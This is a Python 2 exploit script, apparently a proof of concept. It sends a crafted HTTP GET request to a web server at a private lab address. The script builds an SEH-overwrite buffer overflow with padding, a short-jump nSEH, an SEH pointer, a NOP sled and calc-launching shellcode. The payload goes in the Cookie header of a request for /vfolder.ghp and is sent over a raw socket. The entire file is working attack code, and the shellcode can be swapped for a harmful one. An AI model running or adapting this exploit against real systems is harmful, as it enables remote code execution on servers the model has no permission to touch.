#!/usr/bin/python

import struct
import socket
import os
import time
import sys

#define target
host = "192.168.56.3"
port = 80
bufsize = 3000

padding = "/.:/"
padding += "A" * 53

nseh = "\xeb\x14\x90\x90"
seh = "\x05\x86\x01\x10"

nops = "\x90" * 20
#payload = "\xCC" * 32

payload = "\x31\xC9" # xor ecx,ecx
payload += "\x51" # push ecx
payload += "\x68\x63\x61\x6C\x63" # push 0x636c6163
payload += "\x54" # push dword ptr esp
payload += "\xB8\xC7\x93\xC2\x77" # mov eax,0x77c293c7
payload += "\xFF\xD0" # call eax

sploit = padding
sploit += nseh
sploit += seh
sploit += nops
sploit += payload

filler = "\x43"*(bufsize-len(sploit))

buf = sploit
buf += filler

# Define GET request

request = "GET /vfolder.ghp HTTP/1.1\r\n"
request += "Host: " + host + "\r\n"
request += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.8.0" + "\r\n"
request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" + "\r\n"
request += "Accept-Language: en-US,en;q=0.5" + "\r\n"
request += "Accept-Encoding: gzip, deflate" + "\r\n"
request += "Referer: " + "http://" + host + "/" + "\r\n"
request += "Cookie: SESSIONID=16246; UserID=PassWD=" + buf + "; frmUserName=; frmUserPass=;"    # Insert buffer here
request += " rememberPass=pass"
request += "\r\n"
request += "Connection: keep-alive" + "\r\n"
request += "If-Modified-Since: Mon, 19 Jun 2017 17:36:03 GMT" + "\r\n"
 
print "[*] Connecting to target: " + host

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
#connection to target
	connect = s.connect((host,port))
	print "[+] Connected to: " + host
except:
	print "[!] " + host + "didn't respond....\n"
	sys.exit(0)

# send payload
print "[+] Sending Payload to target..."
s.send(request + "\r\n\r\n")
print "[+] Payload sent\n"
s.close()

